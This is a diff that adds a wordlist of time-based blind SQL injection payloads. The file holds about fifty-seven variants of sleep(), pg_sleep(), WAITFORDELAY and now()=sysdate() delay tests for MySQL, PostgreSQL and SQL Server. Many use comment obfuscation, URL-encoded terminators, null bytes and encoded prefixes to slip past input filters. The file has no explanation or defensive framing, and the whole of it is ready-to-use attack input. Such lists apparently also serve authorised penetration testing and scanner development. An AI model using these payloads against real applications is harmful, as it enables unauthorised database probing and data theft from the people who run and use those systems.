@@ -1,0 +1,57 @@
+XOR(if(now()=sysdate(),sleep(7),0))XOR%23
+'or sleep(7)--#
+'or sleep(7)#
+'or sleep(7)='#
+'or sleep(7)='--
+'/*F*/or/*F*/sleep(7)='
+'or sleep(7)--%23
+'or sleep(7)%23
+'or sleep(7);%00
+or sleep(7)--+-
+or sleep(7)#
+'/*f*/or/*f*/sleep/*f*/(7)--#
+'/*f*/or/*f*/sleep/*f*/(7)#
+or sleep(7)%23
+'/*f*/or/*f*/sleep/*f*/(7)--%23
+'/*f*/or/*f*/sleep/*f*/(7)%23
+'/*f*/or/*f*/sleep/*f*/(7);%00
+or/*f*/sleep/*f*/(7)--+-
+or/*f*/sleep/*f*/(7)#
+'XOR(if(now()=sysdate(),sleep(7),0))XOR'
+'OR(if(now()=sysdate(),sleep(7),0))--#
+'OR(if(now()=sysdate(),sleep(7),0))#
+or/*f*/sleep/*f*/(7)%23
+'OR(if(now()=sysdate(),sleep(7),0))--%23
+'OR(if(now()=sysdate(),sleep(7),0))%23
+'OR(if(now()=sysdate(),sleep(7),0));%00
+OR(if(now()=sysdate(),sleep(7),0))--+-
+OR(if(now()=sysdate(),sleep(7),0))#
+OR(if(now()=sysdate(),sleep(7),0))%23
+'WAITFORDELAY'0:0:7';%00
+'WAITFORDELAY'0:0:7'#
+'WAITFORDELAY'0:0:7'%23
+'WAITFORDELAY'0:0:7';%00
+WAITFORDELAY'0:0:7'#
+WAITFORDELAY'0:0:7'%23
+WAITFORDELAY'0:0:7'--+-
+'WAITFORDELAY'0:0:7'--+-
+'WAITFORDELAY'0:0:7'='
+\/*F*/or/*f*/sleep(7)%23
+'/*f*/OR/*f*/pg_sleep(7)#
+'/*f*/OR/*f*/pg_sleep(7)%23
+'/*f*/OR/*f*/pg_sleep(7);%00
+/*f*/OR/*f*/pg_sleep(70)--+-
+/*f*/OR/*f*/pg_sleep(70)#
+/*f*/OR/*f*/pg_sleep(70)%23
+'/*f*/OR/*f*/pg_sleep(7)=';%00
+\)/*F*/or/*f*/sleep(7)%23
+\)/*F*/or/*f*/sleep(7)%23
+%E2%84%A2%27/*F*/or/*f*/sleep(7)%23
+%E2%84%A2%27/*F*/or/*f*/pg_sleep(7)%23
+%E2%84%A2%22/*F*/or/*f*/pg_sleep(7)%23
+%E2%84%A2%22/*F*/or/*f*/sleep(7)%23
+%E2%84%A2%22/*F*/or/*f*/sleep(7)--+-
+%E2%84%A2\)/*F*/or/*f*/sleep(7)--+-
+%E2%84%A2%27)/*F*/or/*f*/sleep(7)--+-
+%E2%84%A2'/*F*/or/*f*/sleep(7)='
+%E2%84%A2')/*F*/or/*f*/sleep(7)='
